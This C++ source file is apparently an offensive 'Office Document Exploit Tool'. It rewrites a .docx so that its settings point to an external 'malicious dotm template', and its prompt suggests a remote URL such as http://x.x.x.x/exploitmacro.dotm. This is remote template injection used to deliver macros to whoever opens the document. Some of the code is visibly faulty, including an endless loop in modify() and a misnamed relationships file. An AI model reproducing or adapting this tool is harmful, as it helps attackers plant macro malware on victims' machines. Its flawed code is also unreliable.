/////////////////////////////////////////////////////////////////////////////
// Chris Sikes
// Name:        Office Document Exploit.cpp
// Version:     1.0
// Purpose:     Microsoft Office Document (.docx) link to a malicious template
// Notes:		Uses the Zip External Lib and MSXML Wrapper tools for functionality
/////////////////////////////////////////////////////////////////////////////
// Office Document Exploit.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <atlbase.h>
#include "XMLParser.h"
#include <iostream>
#include <string>
#include <conio.h>
#include "Office Document Exploit.h"
#include "zipper.h"
#include "unzipper.h"
#include <fstream>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#undef max

// The one and only application object

CWinApp theApp;

using namespace MSXML2;
using namespace std;
using namespace std;
using namespace ziputils;

const string pathsep = "-dir-";
const string fieldsep = "--fieldsep--";



//Find all occurances of toSearch within data and replace them with replaceStr
//From https://thispointer.com/find-and-replace-all-occurrences-of-a-sub-string-in-c/
void findAndReplaceAll(std::string & data, std::string toSearch, std::string replaceStr)
{
	// Get the first occurrence
	size_t pos = data.find(toSearch);

	// Repeat till end is reached
	while (pos != std::string::npos)
	{
		// Replace this occurrence of Sub String
		data.replace(pos, toSearch.size(), replaceStr);
		// Get the next occurrence from the current position
		pos = data.find(toSearch, pos + toSearch.size());
	}
}


//Parses a manifest entry string for the path within the Zip archive
//Returns: A string representing the path within the Zip archive for the file represented by the manifest entry
//Parameters: mentry - a single entry of the manifest file returned from unzipToADS()
string getZipPathFromManifest(string mentry)
{
	size_t delimindex = 0;
	if ((delimindex = mentry.find(fieldsep)) == string::npos)
		return "";
	return mentry.substr(0, delimindex);
}

//Parses a manifest entry string for the path to the ADS storing the data
//Returns: A string representing the path to the ADS where the data extracted
//Parameters: mentry - a single entry of the manifest file returned from unzipToADS()
string getADSPathFromManifest(string mentry)
{
	size_t delimindex = 0;
	if ((delimindex = mentry.find(fieldsep)) == string::npos)
		return "";
	return mentry.substr(delimindex + fieldsep.length());
}

//Creates a zip archive by including all files and data represented by a manifest file
//Returns: True if the zip archive was successfully created, otherwise false
//Parameters: 
//				archive - the path to the resulting zip archive (ON DISK)
//				manifest - the path to a manifest file (ON DISK, can be ADS)
bool zipFromADS(string archive, string manifest)
{
	ifstream ms(manifest, ios::in);
	string mentry;

	zipper ziparchive;
	ziparchive.open(archive.c_str(), false);

	cout << "Writing all files into " << archive << endl;

	while (getline(ms, mentry))
	{
		string fname = getZipPathFromManifest(mentry);
		//size_t delimindex = 0;
		//if ((delimindex = mentry.find(fieldsep)) == string::npos) 
		if (fname == "")
		{
			cout << "Error: Unable to identify field separator (" << fieldsep << ") in manifest entry\"" << mentry << "\"" << endl;
			ms.close();
			ziparchive.close();
			return false;
		}

		//string fname = mentry.substr(0, delimindex);
		//string adsfname = mentry.substr(delimindex + fieldsep.length());
		string adsfname = getADSPathFromManifest(mentry);

		cout << "File name: " << fname << endl;
		cout << "ADS Location: " << adsfname << endl;
		cout << endl;

		ifstream file(adsfname, ios::in | ios::binary);

		if (file.is_open())
		{
			ziparchive.addEntry(fname.c_str());
			ziparchive << file;
		}
		else
		{
			cout << "Error: Unable to open ADS for " << fname << " aborting!" << endl;
			ms.close();
			ziparchive.close();
			return false;
		}
	}

	ms.close();
	ziparchive.close();
	return true;
}

//Extract a zip archive onto itself using ADS.  Each file in the archive is extracted to its own ADS
//that is attached to the archive NTFS object itself.  Folder structure is maintained by replacing
//the '/' character in the path with the const string pathsep defined in this file.  The string ':temp/' is 
//prepended to the extracted file path prior to this substitution to ensure unique ADS
//Returns: Path to a manifest file storing information about the extracted files
string unzipToADS(string archive)
{
	unzipper zipFile;
	string adsdocname = archive + ":temp" + pathsep;
	string manifestpath = adsdocname + "manifest.txt";
	zipFile.open(archive.c_str());
	auto filenames = zipFile.getFilenames();

	ofstream ms(manifestpath);

	for (auto it = filenames.begin(); it != filenames.end(); it++)
	{
		string fname = *it;
		findAndReplaceAll(fname, "/", pathsep);
		string adsfname = adsdocname + fname;
		ofstream fads(adsfname, ios::out | ios::binary);
		zipFile.openEntry((*it).c_str());
		cout << "Writing " << *it << " to " << adsfname << " ..." << endl;
		zipFile >> fads;
		fads.close();
		ms << *it << fieldsep << adsfname << endl;
	}
	ms.close();

	return manifestpath;
}

//Modifies a file extracted from the zip archive - stub function, currently just appends an XML comment
//Returns: True if the modification was successful, otherwise false
//Parameters: path - path to the file being modified (ON DISK, can be ADS)
bool modifyFile(string path)
{
	string xmlcomment = "<!-- This is a comment -->";
	cout << "Appending XML comment to " << path << endl;
	ofstream file(path, ios::out | ios::app);

	if (!file.is_open())
	{
		cout << "Error: Failed to open " << path << " for editing!" << endl;
		return false;
	}

	file << xmlcomment;
	file.flush();

	return (!file.bad());
}

//Modifies the extracted archive based on information from a supplied manifest file
//Returns: True if the archive was modified, otherwise false
//Parameters: manifest - path to the manifest file (ON DISK, can be ADS)
bool modify(string manifest)
{
	ifstream mf(manifest, ios::in);
	string manifestEntry;

	while (1)
	{

		getline(mf, manifestEntry);

	}

	return modifyFile(getADSPathFromManifest(manifestEntry));
}

//Overwrites one archive with another - intended to overwrite with modified one
//Returns: True if the replacement operation fully succeeded (including delete of newarchive)
//Parameters: oldarchive - path to original archive being replaced, newarchive - path to new archive
bool replaceArchive(string oldarchive, string newarchive)
{
	if (remove(oldarchive.c_str()))
	{
		cout << "Error: Failed to delete original archive (" << oldarchive << ")" << endl;
		return false;
	}

	if (rename(newarchive.c_str(), oldarchive.c_str()))
	{
		cout << "Error: Failed to rename temporary archive (" << newarchive << ") to original (" << oldarchive << ")" << endl;
		return false;
	}


	return true;
}




int main()
{
	string xmlname;
	string filename;
	string xmlname2;
	string archive;
	wstring xmlnameL;
	wstring xmlnameL2;
	LPCTSTR xmlnameLPC;
	LPCTSTR xmlnameLPC2;
	
	XML_PARSER parser;
	



	cout << "---------------------------------" << endl;
	cout << "Welcome to the Office Document Exploit Tool" << endl;
	cout << "Choose target docx file you want to exploit?" << endl;   // later will be docx file
	cout << "> ";
	cin >> archive;

	string manifest = unzipToADS(archive);
		
	ifstream mf(manifest, ios::in);
	string manifestEntry;

	getline(mf, manifestEntry);



	// modify the first settings.xml
	xmlname = "settings.xml";
	filename = xmlname;
	xmlnameL = wstring(xmlname.begin(), xmlname.end());
	parser.Load_XML_Document(xmlnameL.c_str());
	
	// Go to child node
	parser.Go_to_Child();

	// look for  w:attachedTemplate node
	while (1) 
	{
		parser.Go_to_Child();
		wstring nodename = (const wchar_t*)parser.Get_CurrentName();
		if (nodename == L"w:attachedTemplate")
		{
			wstring valuename = (const wchar_t*)parser.Get_Attribute_Value(0);
			wcout << valuename << endl;
			break;
		}
		if (parser.Go_Forward())
		{
			// go forward
		}
		else { // create new child node with attribute name r:id and value rId1
			parser.Go_to_Root();
			LPCTSTR attachtemp = L"w:attachedTemplate";
			parser.Add_LastChildNodeW(attachtemp);
			parser.Set_Attribute(L"r:id", L"rId1");
			//parser.Remove_Attribute(L"xmlns:w");
			break;

		}
	}

	// Save xml file
	cout << "Overwriting file!" << endl;
	xmlnameL = wstring(filename.begin(), filename.end());
	parser.Save_XML_Document(xmlnameL.c_str());



	
	// modify the 2nd settings.xml, settings.xml.rel
	xmlname = "settings.xml.rel";
	filename = xmlname;
	xmlnameL = wstring(xmlname.begin(), xmlname.end());
	parser.Load_XML_Document(xmlnameL.c_str());

	// Go to child node
	parser.Go_to_Child();

	// Add attribute value to replace Target path
	
	cout << "What's the local or remote path for the malicious dotm template?" << endl;
	cout << "Local ex 1: file:///C:\\Users\\User1\\Desktop\\tf7873876.dotx" << endl;
	cout << "Remote ex 1: http://x.x.x.x/exploitmacro.dotm" << endl;
	cin >> xmlname2;
	xmlnameL2 = wstring(xmlname2.begin(), xmlname2.end());
	xmlnameLPC2 = xmlnameL2.c_str();
	parser.Set_Attribute(L"Target", xmlnameLPC2);

	// Save xml file
	cout << "Overwriting file!" << endl;
	xmlnameL = wstring(filename.begin(), filename.end());
	parser.Save_XML_Document(xmlnameL.c_str());


	string tmpfile = "~" + archive;  // works if operator is in current working directory of docx


	zipFromADS(tmpfile, manifest);

	if (replaceArchive(archive, tmpfile))
		cout << "Done!" << endl;

	return 0;
}
